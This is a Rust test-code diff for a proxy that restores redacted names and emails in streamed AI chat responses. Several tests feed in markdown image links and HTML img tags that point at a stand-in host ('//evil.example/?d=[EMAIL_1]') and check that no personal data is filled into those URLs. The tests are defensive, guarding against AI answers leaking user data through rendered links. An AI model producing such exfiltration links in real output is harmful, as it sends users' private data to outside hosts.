+        let data = json!({"p": "/m", "o": "add", "v": {"0": "y"}}).to_string();
+        let _ = ev.on_item(data_item(data));
+        let mut keys: Vec<&str> = ev.tracks.keys().map(String::as_str).collect();
+        keys.sort_unstable();
+        assert_eq!(keys, ["\u{1}m/0", "\u{1}m0", "\u{1}n"]);
+    }
+
+    /// Review finding: JSON carried in a string is parsed as browsers parse
+    /// it (lone surrogates, a BOM) and restored at its own level; one that
+    /// looks like JSON but does not parse passes through, never restored as
+    /// text over its encoded form.
+    #[test]
+    fn json_in_strings_restore_at_their_level_or_not_at_all() {
+        let dir = tempfile::tempdir().unwrap();
+        let e = tagged(dir.path());
+        let q = quoted_tag(&e);
+        let lone = format!("{{\"t\":\"\\ud800 {q}\"}}");
+        let broken = format!("{{\"t\":\"{q}\",}}");
+        let lines = format!("{{\"t\":\"{q}\"}}\n{{\"u\":1}}");
+        let doc = json!({"a": lone, "b": broken, "c": "[NAME_1] and [NAME_1]",
+                         "d": "[1] [NAME_1]", "e": lines});
+        for (ct, body) in [
+            ("application/json", doc.to_string()),
+            ("text/plain", doc.to_string()),
+            (
+                "text/event-stream",
+                String::from_utf8(sse(&[(None, doc.to_string())])).unwrap(),
+            ),
+        ] {
+            for n in [1, 4, 1000] {
+                let out = run(&e, ct, body.as_bytes(), n);
+                let v: Value = match ct {
+                    "text/event-stream" => serde_json::from_str(&datas(&out)[0]).unwrap(),
+                    _ => serde_json::from_slice(&out).unwrap(),
+                };
+                let inner: Value =
+                    parda_wire::body::parse_json(v["a"].as_str().unwrap().as_bytes())
+                        .unwrap_or_else(|err| panic!("{ct} {n}: {err:?}: {}", v["a"]));
+                assert_eq!(inner["t"], format!("\u{fffd} {QUOTED}"), "{ct} {n}");
+                assert_eq!(v["b"], broken, "{ct} {n}");
+                assert_eq!(v["c"], "Ravi Kumar and Ravi Kumar", "{ct} {n}");
+                assert_eq!(v["d"], "[1] Ravi Kumar", "{ct} {n}");
+                assert_eq!(v["e"], lines, "{ct} {n}");
+            }
+        }
+        // A whole body that is clearly JSON but does not parse goes out as
+        // it came (JSON lines are restored line by line).
+        for ct in ["application/json", "text/plain"] {
+            assert_eq!(run(&e, ct, broken.as_bytes(), 3), broken.as_bytes(), "{ct}");
+        }
+    }
+
+    /// Review finding: in a plain-text event stream, data that looks like
+    /// JSON is not text to restore, but the text held back before it must
+    /// go out before it, not after.
+    #[test]
+    fn plain_text_streams_keep_their_order_around_json_looking_data() {
+        let dir = tempfile::tempdir().unwrap();
+        let e = tagged(dir.path());
+        for (deltas, want) in [
+            (vec!["say [", "\"hi\"", " ok"], "say [\"hi\" ok"),
+            (vec!["Hi [NA", "[1] see", " ME_1]"], "Hi [NA[1] see ME_1]"),
+            (
+                vec!["Hi [NA", "{\"x\": 1", " ME_1]"],
+                "Hi [NA{\"x\": 1 ME_1]",
+            ),
+            (
+                vec!["Hi [NA", "ME_1] said", "\"yes\"", " end"],
+                "Hi Ravi Kumar said\"yes\" end",
+            ),
+        ] {
+            let mut body = String::new();
+            for d in &deltas {
+                body.push_str(&format!("data: {d}\n\n"));
+            }
+            for n in [1, 5, 1000] {
+                let out = run(&e, "text/event-stream", body.as_bytes(), n);
+                assert_eq!(datas(&out).concat(), want, "{deltas:?} {n}");
+            }
+        }
+    }
+
+    /// The text of each `{"answer": {"text"}}` snapshot event.
+    fn snapshot_texts(out: &[u8]) -> Vec<String> {
+        events(out)
+            .iter()
+            .filter_map(|ev| serde_json::from_str::<Value>(&ev.data).ok())
+            .filter_map(|v| v["answer"]["text"].as_str().map(str::to_string))
+            .collect()
+    }
+
+    fn snapshot_stream(snaps: &[&str]) -> Vec<u8> {
+        sse(&snaps
+            .iter()
+            .map(|t| (None, json!({"answer": {"text": t}, "step": 1}).to_string()))
+            .collect::<Vec<_>>())
+    }
+
+    /// Review finding: under an unknown key, a value that repeats the
+    /// previous one while text is held back is a delta, not a snapshot (no
+    /// text is lost), and a value that replaces the previous one gets its
+    /// own text, not the previous one's held tail.
+    #[test]
+    fn repeated_and_replacing_values_keep_their_text() {
+        let dir = tempfile::tempdir().unwrap();
+        let e = tagged(dir.path());
+        for (deltas, want) in [
+            (vec!["x ", "[", "[", "y"], "x [[y"),
+            (vec!["a [", "a [", "b"], "a [a [b"),
+            (vec!["[", "[", "1]]"], "[[1]]"),
+            (vec!["[", "[", "NAME_1]", " ok"], "[Ravi Kumar ok"),
+            (vec!["Hi [NA", "ME_1]", "ME_1]"], "Hi Ravi KumarME_1]"),
+        ] {
+            for n in [1, 9, 10_000] {
+                let out = run(&e, "text/event-stream", &openai_stream(&deltas), n);
+                assert_eq!(openai_text(&out), want, "{deltas:?} {n}");
+            }
+        }
+        // A status line replaced by another.
+        let out = run(
+            &e,
+            "text/event-stream",
+            &snapshot_stream(&["Searching [NA", "Done"]),
+            7,
+        );
+        assert_eq!(snapshot_texts(&out), ["Searching [NA", "Done"]);
+    }
+
+    /// Found by the Auto chunking property: a delta that is a whole JSON
+    /// value (`[1]`, `["x"]`) was restored on its own and its text never
+    /// reached the track, so the `]:` of a reference definition it began
+    /// was missed by the URL guard of the delta after it.
+    #[test]
+    fn whole_json_values_are_context_for_what_follows() {
+        let dir = tempfile::tempdir().unwrap();
+        let e = tagged(dir.path());
+        for deltas in [
+            vec![" \n[1]", ": [EMAIL_1]\n\n![a][1]"],
+            vec!["[\"x\"]", ": //evil.example/?d=[EMAIL_1]\n\n![a][\"x\"]"],
+            vec!["x [", "[\"x\"]", ": //e/?d=[EMAIL_1]"],
+        ] {
+            for n in [1, 1000] {
+                let out = run(&e, "text/event-stream", &openai_stream(&deltas), n);
+                let text = openai_text(&out);
+                assert!(!text.contains("ravi@"), "{deltas:?} {n}: {text}");
+                assert_eq!(text.replace("Ravi Kumar", "[NAME_1]"), deltas.concat());
+            }
+        }
+    }
+
     #[test]
     fn json_documents_restore_every_leaf() {
         let dir = tempfile::tempdir().unwrap();
@@ -1869,6 +2942,33 @@ mod tests {
             out.push(String::from_utf16(&u[i..i + n]).unwrap().trim().to_string());
             i += n;
         }
+    }
+
+    #[test]
+    fn frame_lengths_are_measured_once_and_exactly() {
+        let scan = |units| FrameScan {
+            digits: 0,
+            units,
+            bytes: 0,
+            counted: 0,
+        };
+        // "é😀a" is 1 + 2 + 1 UTF-16 units in 2 + 4 + 1 bytes; whatever
+        // follows the frame is never read past.
+        let payload = "é😀a".to_string() + &"x".repeat(1000) + "\u{ff}";
+        let p = payload.as_bytes();
+        assert_eq!(scan(4).measure(p), Measure::Done(7));
+        assert_eq!(scan(0).measure(p), Measure::Done(0));
+        // A count that ends inside a surrogate pair.
+        assert_eq!(scan(2).measure(p), Measure::Invalid);
+        // Byte by byte, then far past the frame in one go.
+        let mut s = scan(4);
+        for n in 0..p.len().min(7) {
+            assert_eq!(s.measure(&p[..n]), Measure::Need, "{n}");
+        }
+        assert_eq!(s.measure(p), Measure::Done(7));
+        // Longer than what has arrived; then invalid UTF-8 inside it.
+        assert_eq!(scan(5000).measure(p), Measure::Need);
+        assert_eq!(scan(5000).measure(b"ab\xffcd"), Measure::Invalid);
     }
 
     #[test]
@@ -1988,6 +3088,105 @@ mod tests {
         }
     }
 
+    /// Run `body` through a rewriter for `ct` in chunks of `n` bytes,
+    /// failing as soon as it takes longer than `limit` (work that grows with
+    /// the square of the body never finishes in time).
+    fn run_within(
+        e: &Engine,
+        ct: &str,
+        body: &[u8],
+        n: usize,
+        limit: std::time::Duration,
+    ) -> Vec<u8> {
+        let started = std::time::Instant::now();
+        let mut t = for_content_type(e, SCOPE, ct);
+        let mut out = Vec::new();
+        for (i, c) in body.chunks(n).enumerate() {
+            out.extend_from_slice(&t.push(c));
+            if i % 1024 == 0 {
+                assert!(
+                    started.elapsed() < limit,
+                    "{ct}: {} of {} bytes after {:?}",
+                    i * n,
+                    body.len(),
+                    started.elapsed()
+                );
+            }
+        }
+        out.extend_from_slice(&t.finish());
+        assert!(started.elapsed() < limit, "{ct}: {:?}", started.elapsed());
+        out
+    }
+
+    /// Scan finding on 06da9ce: an item just under the 16 MiB cap, pushed in
+    /// small chunks, must not be rescanned from its start on every chunk
+    /// (newline and blank-line search, UTF-16 counting); nor may a large
+    /// chunk holding many small items be shifted once per item.
+    #[test]
+    fn large_items_in_small_chunks_take_linear_work() {
+        let dir = tempfile::tempdir().unwrap();
+        let e = tagged(dir.path());
+        // Generous: linear work takes about ten seconds per case
+        // unoptimised; quadratic work takes hours.
+        let limit = std::time::Duration::from_secs(120);
+        let size = MAX_ITEM_BYTES - 64 * 1024;
+        let unit = "aé😀 b";
+        let filler = unit.repeat(size / unit.len());
+        let text = format!("{filler} [NAME_1]");
+        let want = format!("{filler} Ravi Kumar");
+        let doc = json!({"t": &text}).to_string();
+        let restored_doc = json!({"t": &want}).to_string();
+        let cases = [
+            (
+                "text/event-stream",
+                format!("data: {doc}\n\n"),
+                format!("data: {restored_doc}\n\n"),
+            ),
+            (
+                "application/x-ndjson",
+                format!("{doc}\n"),
+                format!("{restored_doc}\n"),
+            ),
+            ("application/json", doc.clone(), restored_doc.clone()),
+            (
+                "application/json",
+                format!(")]}}'\n{}", frame(&format!("[[\"wrb.fr\",{doc}]]"))),
+                format!(
+                    ")]}}'\n{}",
+                    frame(&format!("[[\"wrb.fr\",{restored_doc}]]"))
+                ),
+            ),
+            (
+                "text/plain",
+                format!("{}[NAME_1]", " ".repeat(size)),
+                format!("{}Ravi Kumar", " ".repeat(size)),
+            ),
+        ];
+        for (ct, body, want) in cases {
+            let out = run_within(&e, ct, body.as_bytes(), 256, limit);
+            assert!(out == want.as_bytes(), "{ct}: not restored exactly");
+        }
+        // Many small items in one large chunk (distinct values: identical
+        // ones would read as cumulative snapshots).
+        let (mut nd, mut nd_want, mut i) = (String::new(), String::new(), 0);
+        while nd.len() < size {
+            nd.push_str(&format!("{{\"t\":\"[NAME_1] {i}\"}}\n"));
+            nd_want.push_str(&format!("{{\"t\":\"Ravi Kumar {i}\"}}\n"));
+            i += 1;
+        }
+        let out = run_within(&e, "application/x-ndjson", nd.as_bytes(), nd.len(), limit);
+        assert!(
+            out == nd_want.as_bytes(),
+            "ndjson lines not restored exactly"
+        );
+        let one = frame("[[\"wrb.fr\",\"[NAME_1]\"]]");
+        let body = format!(")]}}'\n{}", one.repeat(size / one.len()));
+        let out = run_within(&e, "application/json", body.as_bytes(), body.len(), limit);
+        let out = String::from_utf8(out).unwrap();
+        assert_eq!(frames(&out).len(), size / one.len());
+        assert!(!out.contains("[NAME_1]"));
+    }
+
     #[test]
     fn text_bodies_restore_and_binary_passes() {
         let dir = tempfile::tempdir().unwrap();
@@ -2028,6 +3227,83 @@ mod tests {
             "text/plain",
         ] {
             assert!(!for_content_type(&e, SCOPE, ct).is_passthrough(), "{ct}");
+        }
+    }
+
+    /// Review findings (text/plain answers): a body that looks like JSON is
+    /// restored as JSON (one document, or NDJSON lines) or passes through,
+    /// never as text; prose that merely starts with a bracket streams.
+    #[test]
+    fn text_plain_answers_are_json_or_text_never_both() {
+        let dir = tempfile::tempdir().unwrap();
+        let e = tagged(dir.path());
+        let q = quoted_tag(&e);
+        let ndjson = format!(
+            "{}\n{}\n",
+            json!({"t": format!("at {q}")}),
+            json!({"t": "bye"})
+        );
+        let pointy = "{\"t\":\"![x](\\u003c//evil.example/?d= [NAME_1]\\u003e)\"}\n{\"t\":\"x\"}\n";
+        let literal = "\"![x](\\u003c//evil.example/?d= [NAME_1]\\u003e) [EMAIL_1]\"";
+        for n in [1, 3, 7, 1000] {
+            let out = String::from_utf8(run(&e, "text/plain", ndjson.as_bytes(), n)).unwrap();
+            let lines: Vec<Value> = out
+                .lines()
+                .map(|l| serde_json::from_str(l).unwrap_or_else(|err| panic!("{err}: {out:?}")))
+                .collect();
+            assert_eq!(lines[0]["t"], format!("at {QUOTED}"));
+            assert_eq!(lines[1]["t"], "bye");
+            // `<` escaped as Go and .NET encoders do: the guard reads the
+            // decoded text, a pointy destination keeps its tag.
+            let out = String::from_utf8(run(&e, "text/plain", pointy.as_bytes(), n)).unwrap();
+            let first: Value = serde_json::from_str(out.lines().next().unwrap()).unwrap();
+            assert_eq!(first["t"], "![x](<//evil.example/?d= [NAME_1]>)");
+            let out = run(&e, "text/plain", literal.as_bytes(), n);
+            let v: Value = serde_json::from_slice(&out).unwrap();
+            assert_eq!(
+                v, "![x](<//evil.example/?d= [NAME_1]>) ravi@example.com",
+                "{n}"
+            );
+            // JSON-looking but neither a document nor JSON lines: as it came.
+            for raw in [
+                format!("{{\"t\":\"at {q}\"}}\n{{oops\n"),
+                format!("[\"{q}\", ]"),
+                format!("\"{q}"),
+            ] {
+                let out = String::from_utf8(run(&e, "text/plain", raw.as_bytes(), n)).unwrap();
+                assert!(!out.contains("Lotus") || out.lines().all(|l| l.contains("oops") || serde_json::from_str::<Value>(l).is_ok()), "{raw:?} -> {out:?}");
+                assert!(!out.contains(QUOTED), "{raw:?} -> {out:?}");
+            }
+        }
+        // Prose starting with a tag or a bracket is text, restored as it
+        // streams.
+        let mut t = for_content_type(&e, SCOPE, "text/plain");
+        let outs: Vec<Bytes> = ["[", "NAME_1] said hello", " and more"]
+            .iter()
+            .map(|c| t.push(c.as_bytes()))
+            .collect();
+        assert!(outs[1].starts_with(b"Ravi Kumar said"), "{outs:?}");
+        assert_eq!(outs[2], " and more");
+        assert!(t.finish().is_empty());
+        for (text, start) in [
+            ("[", JsonStart::Open),
+            ("[1, 2", JsonStart::Open),
+            ("{\"", JsonStart::Clear),
+            ("[1, {", JsonStart::Clear),
+            ("[[\"a\"", JsonStart::Clear),
+            ("[1] see", JsonStart::Closed(3, false)),
+            ("[NAME_1]", JsonStart::Not),
+            ("[1, 2] or [", JsonStart::Closed(6, false)),
+            ("[\"a\", ]", JsonStart::Broken),
+            ("{\"v\": NaN}", JsonStart::Broken),
+        ] {
+            assert_eq!(json_start(text), start, "{text}");
+        }
+        for body in ["[1] see [NAME_1]", "{x} [NAME_1]", "\"Hi\" said [NAME_1]"] {
+            for n in [1, 2, 5] {
+                let out = String::from_utf8(run(&e, "text/plain", body.as_bytes(), n)).unwrap();
+                assert_eq!(out, body.replace("[NAME_1]", "Ravi Kumar"), "{body:?} {n}");
+            }
         }
     }
 
@@ -2269,34 +3545,46 @@ mod tests {
     }
 
     #[test]
-    fn json_prefixes() {
-        for t in [
-            "{",
-            "[",
-            "{\"q\": \"[TER",
-            "{\"q\": \"a\\\"b",
-            "[1, \"a",
-            "[[{\"a\":[",
-            "[n",
-            "[tr",
-            "{\"a\": 1, \"b\"",
+    fn streamed_texts_are_json_only_once_they_clearly_are() {
+        use TextKind::{Json, Plain};
+        for (t, want) in [
+            ("{\"q\": \"[TER", Some(Json)),
+            ("{\"q\": \"a\\\"b", Some(Json)),
+            ("[1, \"a", Some(Json)),
+            ("[[{\"a\":[", Some(Json)),
+            ("{\"a\": 1, \"b\"", Some(Json)),
+            ("[\"a\", ]", Some(Json)),
+            ("{\"a\" 1", Some(Json)),
+            ("[1]\n{\"a\"", Some(Json)),
+            ("{\"a\": \"x\"}", Some(Json)),
+            ("[\"a\"] said", Some(Json)),
+            ("{", None),
+            ("[", None),
+            ("[1", None),
+            ("[1, 2", None),
+            ("[n", None),
+            ("[tr", None),
+            ("[1]", None),
+            ("  ", None),
+            ("[NAME_1] said", Some(Plain)),
+            ("[name_1]", Some(Plain)),
+            ("[1] see", Some(Plain)),
+            ("{NAME_1}", Some(Plain)),
+            ("{ is", Some(Plain)),
+            ("{\"a\": 1} more", Some(Json)),
+            ("[na", Some(Plain)),
+            ("text", Some(Plain)),
         ] {
-            assert!(is_json_prefix(t), "{t}");
+            assert_eq!(sniff_text(t, false), want, "{t}");
         }
-        for t in [
-            "[NAME_1] said",
-            "[name_1]",
-            "[1] see",
-            "[1]",
-            "{NAME_1}",
-            "{\"a\": 1} more",
-            "[na",
-            "text",
-            "",
-            "{\"a\" 1",
-        ] {
-            assert!(!is_json_prefix(t), "{t}");
-        }
+        assert_eq!(sniff_text("[", true), Some(Plain));
+        assert_eq!(sniff_text("", true), Some(Plain));
+        // Past the sniffing limit, a start that is still JSON is JSON; one
+        // that stopped being JSON within it is not, however long.
+        let long = format!("[{}", "1, ".repeat(SNIFF_MAX));
+        assert_eq!(sniff_text(&long, false), Some(Json));
+        let prose = format!("[1] {}", "a".repeat(SNIFF_MAX * 2));
+        assert_eq!(sniff_text(&prose, false), Some(Plain));
     }
 
     #[test]
@@ -2431,6 +3719,85 @@ mod tests {
             "{}",
             String::from_utf8_lossy(&out)
         );
+        // The same inside a patch batch, followed by a bare `{"v"}` that
+        // continues the batch's last op.
+        let body = sse(&[
+            (
+                Some("delta"),
+                json!({"p": "/message/content/parts/0", "o": "append",
+                       "v": "<img alt=x src=\"//e/?d= "})
+                .to_string(),
+            ),
+            (
+                Some("delta"),
+                json!({"p": "", "o": "patch", "v": [
+                    {"p": "/message/content/parts/0", "o": "truncate", "v": 20},
+                    {"p": "/message/content/parts/0", "o": "append", "v": "[EMAIL_1] "}]})
+                .to_string(),
+            ),
+            (Some("delta"), json!({"v": "[NAME_1]\">"}).to_string()),
+        ]);
+        for n in [1, 9, 1000] {
+            let out = String::from_utf8_lossy(&run(&e, "text/event-stream", &body, n)).into_owned();
+            assert!(
+                !out.contains("ravi@") && !out.contains("Ravi"),
+                "{n}: {out}"
+            );
+        }
+    }
+
+    /// M3: a forced flush (too many events held back) in the middle of a
+    /// streamed JSON value keeps the value's URL-guard state, and the text
+    /// after the flush still goes out.
+    #[test]
+    fn forced_flushes_keep_the_guard_state() {
+        let dir = tempfile::tempdir().unwrap();
+        let e = tagged(dir.path());
+        // Inside an HTML tag, `[NAM` (an attribute name) is held back. The
+        // hold limit flushes it, and the value goes on with a quoted
+        // attribute value: a URL, even with a space in it.
+        let pieces = [
+            r#"{"html": "<img alt=x [NAM"#,
+            r#"E_1] src=\"//evil.example/?d= [NAME_1]\">"}"#,
+        ];
+        let delta = |p: &str| {
+            json!({"type": "content_block_delta", "index": 1,
+                   "delta": {"type": "input_json_delta", "partial_json": p}})
+            .to_string()
+        };
+        let mut evs = vec![
+            (
+                Some("content_block_start"),
+                json!({"type": "content_block_start", "index": 1,
+                       "content_block": {"type": "tool_use", "id": "t1", "name": "show",
+                                         "input": {}}})
+                .to_string(),
+            ),
+            (Some("content_block_delta"), delta(pieces[0])),
+        ];
+        for _ in 0..MAX_HELD_EVENTS + 6 {
+            evs.push((Some("ping"), json!({"type": "ping"}).to_string()));
+        }
+        evs.push((Some("content_block_delta"), delta(pieces[1])));
+        evs.push((
+            Some("content_block_stop"),
+            json!({"type": "content_block_stop", "index": 1}).to_string(),
+        ));
+        let body = sse(&evs);
+        for n in [1, 13, 100_000] {
+            let out = run(&e, "text/event-stream", &body, n);
+            let json_text: String = events(&out)
+                .iter()
+                .filter_map(|ev| serde_json::from_str::<Value>(&ev.data).ok())
+                .filter_map(|v| v["delta"]["partial_json"].as_str().map(str::to_string))
+                .collect();
+            let v: Value = serde_json::from_str(&json_text)
+                .unwrap_or_else(|err| panic!("{n}: {err}: {json_text}"));
+            assert_eq!(
+                v["html"], "<img alt=x [NAME_1] src=\"//evil.example/?d= [NAME_1]\">",
+                "{n}"
+            );
+        }
     }
 
     #[test]
@@ -2854,8 +4221,49 @@ mod tests {
         e
     }
 
+    /// Pieces where none repeats or extends the one before it: under an
+    /// unknown key those read as deltas whatever the format.
+    fn unambiguous_deltas(pieces: &[String]) -> bool {
+        pieces
+            .windows(2)
+            .all(|w| w[0].is_empty() || !w[1].starts_with(w[0].as_str()))
+    }
+
     proptest! {
         #![proptest_config(ProptestConfig::with_cases(512))]
+
+        /// Unknown keys (Kind::Auto): OpenAI-shaped deltas and cumulative
+        /// snapshots restore exactly under any split and chunking.
+        #[test]
+        fn auto_restore_under_any_chunking_equals_whole_text_restore(
+            text in arb_text(),
+            cuts in proptest::collection::vec(0usize..200, 0..8),
+            chunk in 1usize..40,
+        ) {
+            prop_assume!(sniff_text(&text, true) == Some(TextKind::Plain));
+            let e = shared_engine();
+            let mut whole = Guarded::new(e.stream_restorer(SCOPE).url_safe());
+            let mut want = whole.push(&text);
+            want.push_str(&whole.finish());
+            let pieces = split_at(&text, &cuts);
+            let refs: Vec<&str> = pieces.iter().map(String::as_str).collect();
+            if unambiguous_deltas(&pieces) {
+                let out = run(e, "text/event-stream", &openai_stream(&refs), chunk);
+                prop_assert_eq!(openai_text(&out), want.clone());
+            }
+            // Snapshots that grow (an equal one, while text is held back,
+            // reads as a delta that repeats).
+            let mut snaps = Vec::new();
+            let mut acc = String::new();
+            for p in pieces.iter().filter(|p| !p.is_empty()) {
+                acc.push_str(p);
+                snaps.push(acc.clone());
+            }
+            let refs: Vec<&str> = snaps.iter().map(String::as_str).collect();
+            let out = run(e, "text/event-stream", &snapshot_stream(&refs), chunk);
+            let texts = snapshot_texts(&out);
+            prop_assert_eq!(texts.last().cloned().unwrap_or_default(), want);
+        }
 
         /// For any split of the answer into events and any chunking of the
         /// stream, the client's text equals restoring the whole text.
@@ -2882,8 +4290,19 @@ mod tests {
             }
             let pieces = split_at(&text, &cuts);
             let refs: Vec<&str> = pieces.iter().map(String::as_str).collect();
+            // A chatgpt.com part is JSON text when its whole text starts as
+            // JSON: then it is restored as JSON text, whatever the split.
+            let part_want = match sniff_text(&text, true) {
+                Some(TextKind::Json) => {
+                    let mut r = TextRestorer::json(e, SCOPE);
+                    let mut w = r.push(&text);
+                    w.push_str(&r.finish());
+                    w
+                }
+                _ => want.clone(),
+            };
             let out = run(e, "text/event-stream", &chatgpt_stream(&refs), chunk);
-            prop_assert_eq!(chatgpt_text(&out), want.clone());
+            prop_assert_eq!(chatgpt_text(&out), part_want);
             let out = run(e, "text/event-stream", &claude_stream(&refs, true), chunk);
             prop_assert_eq!(claude_text(&out), want.clone());
             let out = run(e, "text/event-stream", &claude_stream(&refs, false), chunk);
